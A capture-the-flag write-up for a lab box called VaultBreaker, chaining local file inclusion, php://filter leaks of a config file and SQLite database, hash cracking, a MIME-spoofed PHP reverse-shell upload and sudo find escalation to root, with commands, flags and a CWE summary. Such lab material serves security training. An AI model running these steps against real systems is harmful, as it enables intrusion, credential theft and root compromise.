# VaultBreaker — Full Solution / Writeup

Target: `http://localhost:8080` (replace `TARGET` with `localhost` / the box IP).

## Recon

```bash
nmap -p- --min-rate=1000 -T4 TARGET
# 80/tcp open http (Apache/PHP)
```

Directory busting surfaces the admin surface:

```bash
gobuster dir -u http://TARGET:8080 -w /usr/share/wordlists/dirb/common.txt
# /index.php, /login.php, /admin.php, /view.php, /uploads/
```

Browsing the docs reveals a `view.php?file=` parameter and `notes.txt` hints at
a config file, a hashed admin password, and elevated maintenance scripts.

---

## Flag 1 — Initial access via LFI

`view.php` blocks the literal `..` substring but passes the `?file=` value
straight to `include()` with no jail check. Absolute paths and PHP stream
wrappers are not blocked.

Confirm LFI with a known readable file:

```bash
curl 'http://TARGET:8080/view.php?file=/etc/passwd'
```

Read the foothold flag:

```bash
curl 'http://TARGET:8080/view.php?file=/var/www/flag1.txt'
# HTB{lf1_g4v3_y0u_th3_f00th0ld}
```

> Flag 1: `HTB{lf1_g4v3_y0u_th3_f00th0ld}`

---

## Flag 2 — Find the admin credentials

### 2a. Leak the application config

Use the `php://filter` wrapper to disclose `config.php` source as base64:

```bash
curl 'http://TARGET:8080/view.php?file=php://filter/convert.base64-encode/resource=config.php' \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

Decoded, this reveals:

```php
define('DB_PATH', __DIR__ . '/data/users.db');
```

### 2b. Extract the credential database

The SQLite DB is binary; pull it through the LFI as base64 and reconstruct it:

```bash
curl -s 'http://TARGET:8080/view.php?file=php://filter/convert.base64-encode/resource=/var/www/html/data/users.db' \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d > users.db
sqlite3 users.db 'SELECT username, password_hash FROM users;'
# admin|<sha256 hash of the password>
```

### 2c. Crack the hash

The hash is SHA-256. Put it in a file and crack with rockyou:

```bash
echo '<hash>' > admin.hash
hashcat -m 1400 admin.hash /usr/share/wordlists/rockyou.txt
# or: john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
```

Recovered credential: **`admin : letmein123`**

### 2d. Authenticate

```bash
# Browser flow is easiest; CLI example:
curl -c cookies.txt -d 'username=admin&password=letmein123' \
  http://TARGET:8080/login.php -L
```

The admin console (`admin.php`) verifies the compromise and prints Flag 2.

> Flag 2: `HTB{cr4ck3d_th3_4dm1n_p4ssw0rd}`

---

## Flag 3 — Create a reverse shell and escalate

### 3a. Upload a PHP reverse shell

`upload.php` only validates the client-controlled MIME type
(`$_FILES['file']['type']`) and applies no extension allowlist. Edit
`payloads/php-reverse-shell.php` and set `$ip` / `$port` to your listener,
then upload with a spoofed `Content-Type`:

```bash
# listener (your box)
nc -lvnp 4444

# upload (reuse the admin session cookie)
curl -b cookies.txt \
  -F 'file=@payloads/php-reverse-shell.php;type=image/jpeg' \
  http://TARGET:8080/upload.php
```

### 3b. Trigger the shell

```bash
curl http://TARGET:8080/uploads/php-reverse-shell.php
```

Your `nc` listener now holds a shell as `www-data`.

### 3c. Privilege escalation to root

Enumerate sudo rights:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
```

`find` is a classic GTFOBins sudo primitive — spawn a root shell, then read the
root-only flag:

```bash
sudo find . -exec /bin/sh \; -quit
# whoami -> root
cat /root/flag3.txt
# HTB{r00t_v1a_sud0_f1nd_r3vsh3ll}
```

> Flag 3: `HTB{r00t_v1a_sud0_f1nd_r3vsh3ll}`

---

## Known alternate routes

- **Flag 2 via `/proc/self/environ`:** Flag 2 is stored only in the runtime
  environment (not in any source file). An advanced LFI can read it with
  `view.php?file=php://filter/convert.base64-encode/resource=/proc/self/environ`
  and decode the result. The intended path above (crack creds → log in) is the
  taught objective; this is the harder shortcut.
- **Flag 2 via source review of `admin.php`:** reading `admin.php` through
  `php://filter` shows *how* the flag is fetched (`getenv('VAULT_FLAG2')`) but
  not its value, so this does not bypass the env-var design.

---

## Vulnerability summary

| Step | Bug | CWE |
|------|-----|-----|
| Flag 1 | LFI via unsanitized `include($_GET['file'])` | CWE-98 |
| Flag 2 | Hardcoded DB path leaked by LFI; weak, crackable admin password | CWE-547 / CWE-798 |
| Flag 3 | Upload validates MIME type only; PHP executes in `/uploads/` | CWE-434 |
| Flag 3 | Over-broad `sudo` grant on `find` | CWE-250 / CWE-269 |
